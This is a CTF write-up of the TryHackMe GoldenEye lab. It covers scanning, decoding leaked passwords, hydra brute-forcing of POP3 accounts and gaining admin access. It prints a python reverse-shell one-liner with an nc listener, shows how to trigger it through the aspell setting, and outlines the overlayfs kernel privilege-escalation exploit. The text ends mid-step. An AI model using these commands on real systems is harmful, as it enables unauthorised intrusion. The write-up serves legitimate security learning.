# THM-GoldenEye-writeup
Bond, James Bond. A guided CTF.

![77b55a2ac1ac79ca534d6fc003c042b3](https://user-images.githubusercontent.com/94487022/160829623-026285c0-359d-4d02-87b8-b31d078a107b.png)

Scanning ports as usual. 

``nmap -p- -Pn <Machine IP>``

![nmapresult](https://user-images.githubusercontent.com/94487022/160829845-21abb82f-5bed-4f2b-b042-93d9d3da0aa2.png)

Nmap detects 4 open ports. Looks like 80 port is open so there is a website. Let's check.

![website](https://user-images.githubusercontent.com/94487022/160830612-c65f64a2-e989-42c8-95f2-f20c77d6d25f.png)

Reviewing source code.

![sourcepage](https://user-images.githubusercontent.com/94487022/160831159-46cc97cb-ebe9-4cd8-afbc-97dddd435a89.png)

What is terminal.js? Let's see what is.

![boriswithencodedpasswd](https://user-images.githubusercontent.com/94487022/160831358-1c76bf33-3775-46fd-a69c-b39406e996f1.png)

There is a sensitive data. Problem is encoded password. That is encoded with HTML entity.

![decode](https://user-images.githubusercontent.com/94487022/160831792-92752eec-199b-4210-bb80-0f6371cd3aa0.png)

Got the password. Now try this on the /sev-home page.

![loginpage](https://user-images.githubusercontent.com/94487022/160832121-1ff357c7-b40e-4948-9eee-b4c3a54bd31d.png)

![wein](https://user-images.githubusercontent.com/94487022/160832161-72ededc8-fafe-415e-b4c6-32a549f25609.png)

We're in. We need to access the pop3 server.

![pop3loginfailed](https://user-images.githubusercontent.com/94487022/160832592-8458218e-4809-4ce6-bf7b-debb69261267.png)

Access denied. We can brute-force via hydra. I ran hydra with rockyou.txt but didn't work. After that tried fasttrack.txt.

``hydra -l boris -P /usr/share/wordlists/fasttrack.txt <Machine IP> -s 55007 pop3``


![pop3credentials](https://user-images.githubusercontent.com/94487022/160833293-f11a2e14-a786-4cc0-82f3-683550c263b3.png)

We got password. When we logged in, try to read all emails contents.

![firstmessage](https://user-images.githubusercontent.com/94487022/160833462-6e9ae103-7c77-4014-ba58-156ef5d71d65.png)

![secondmssg](https://user-images.githubusercontent.com/94487022/160833672-2a202f7b-e6e4-4781-8f89-8f4d137e296f.png)

![thirdmsg](https://user-images.githubusercontent.com/94487022/160833713-7a5e242a-26fc-455d-8f4b-bdcf382a3195.png)

We still need more intel. Now let's try to brute force again with natalya.

``hydra -l natalya -P /usr/share/wordlists/fasttrack.txt <Machine IP> -s 55007 pop3``


![natalyapsswrd](https://user-images.githubusercontent.com/94487022/160834202-8fd683a4-f4c0-4097-90b1-f321b817d237.png)

![natalyafirstmsg](https://user-images.githubusercontent.com/94487022/160834250-63513e4d-596a-493a-b7d8-8970809483ff.png)

![natalyasecondmsg](https://user-images.githubusercontent.com/94487022/160834254-fe1c7275-29e1-4f12-8c71-3079d40302bc.png)

OK. So we got student xenia’s login credentials. The message also mentioned an internal domain called severnaya-station.com/gnocertdir. To connect with the domain, we need to edit /etc/hosts file.

![etchostsedit](https://user-images.githubusercontent.com/94487022/160834887-4aff85b8-4cd5-4edf-b140-296d1c70f068.png)

We are ready to access website. We logged in.

![messagefromdoak](https://user-images.githubusercontent.com/94487022/160835225-fce4469e-64ae-4512-8425-4a86aba8c38b.png)

![mailusername](https://user-images.githubusercontent.com/94487022/160835537-00cf5d04-540c-443b-af8a-1d0e036f6108.png)

There is a message from Mr. Doak. He gave us his own username. Time to brute force.

``hydra -l doak -P /usr/share/wordlists/fasttrack.txt <Machine IP> -s 55007 pop3``


![doakpasswd](https://user-images.githubusercontent.com/94487022/160835792-f87d7929-dbbe-4e00-b4d5-d872b7b7af75.png)

![doaksmailmsg](https://user-images.githubusercontent.com/94487022/160835905-4699696d-a9d3-426f-84a0-532f619e145c.png)

Thanks to Mr. Doak. He gave us his own password again. We logged in.

![forjames](https://user-images.githubusercontent.com/94487022/160836197-58f9f7d8-ad4f-4548-bca1-42f6d3a1548c.png)

We're in and got file named "forjames". Downloaded.

![s3crettxt](https://user-images.githubusercontent.com/94487022/160836454-844f5b8c-344a-4390-a57d-a8b39e79de87.png)

![for007jpg](https://user-images.githubusercontent.com/94487022/160836477-9a29c160-8c06-41e8-b6c2-3e64883f8fee.png)

Let’s analyze its metadata.

``$ wget http://<Machine IP>/dir007key/for-007.jpg
  $ /data/src/exiftool-12/exiftool for-007.jpg
  ExifTool Version Number         : 12.00
  File Name                       : for-007.jpg
  Directory                       : .
  File Size                       : 15 kB
File Modification Date/Time     : 2018:04:25 02:40:02+02:00
File Access Date/Time           : 2020:06:24 18:39:55+02:00
File Inode Change Date/Time     : 2020:06:24 18:39:54+02:00
File Permissions                : rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
X Resolution                    : 300
Y Resolution                    : 300
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : eFdpbnRlcjE5OTV4IQ==
Make                            : GoldenEye
Resolution Unit                 : inches
Software                        : linux
Artist                          : For James
Y Cb Cr Positioning             : Centered
Exif Version                    : 0231
Components Configuration        : Y, Cb, Cr, -
User Comment                    : For 007
Flashpix Version                : 0100
Image Width                     : 313
Image Height                    : 212
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 313x212
Megapixels                      : 0.066``


There is a image description with encoded data.

`` eFdpbnRlcjE5OTV4IQ== > xWinter1995x! ``


We can now login as admin.

![admindashboard](https://user-images.githubusercontent.com/94487022/160872290-52ad032f-0c69-4c13-8e50-b38059e3cb69.png)

We need to generate a reverse shell. From here we get a reverse shell using python and netcat.

``nc -nvlp 4444``

``python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
``

Hint : Settings->Aspell->Path to aspell field, add your code to be executed. Then create a new page and "spell check it".

There are 2 settings to edit.

![spell](https://user-images.githubusercontent.com/94487022/160873125-d21d8a8c-0272-450a-b35a-897b2028f5c6.png)

Now go to Blog > Add a new entry and click spell checker button.

![spellchecker](https://user-images.githubusercontent.com/94487022/160874199-d1752099-0e85-4193-a51a-207667dbf102.png)

That's it. We got a shell.

We can see kernel version now.

``
$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
``


kernel version is ``3.13.0-32-generic``.

This machine is vulnerable to the overlayfs exploit. The exploitation is technically very simple:

  Create new user and mount namespace using clone with CLONE_NEWUSER|CLONE_NEWNS flags.
  
  Mount an overlayfs using /bin as lower filesystem, some temporary directories as upper and work directory.
  
  Overlayfs mount would only be visible within user namespace, so let namespace process change CWD to overlayfs, thus making the overlayfs also visible outside the namespace via the proc filesystem.
  
  Make su on overlayfs world writable without changing the owner
  
  Let process outside user namespace write arbitrary content to the file applying a slightly modified variant of the SetgidDirectoryPrivilegeEscalation exploit.
  
  Execute the modified su binary
  

You can download the exploit from here: https://www.exploit-db.com/exploits/37292
  
  Exploit Title                                                                       |  Path
  ------------------------------------------------------------------------------------ ---------------------------------
  Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37292.c
  
  
  Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Pri | linux/local/37293.txt
  ------------------------------------------------------------------------------------ ---------------------------------
  Shellcodes: No Results
  
  
  After that transfer the exploit that you have downloaded 37292.c to the server.
  ``-m 37292``
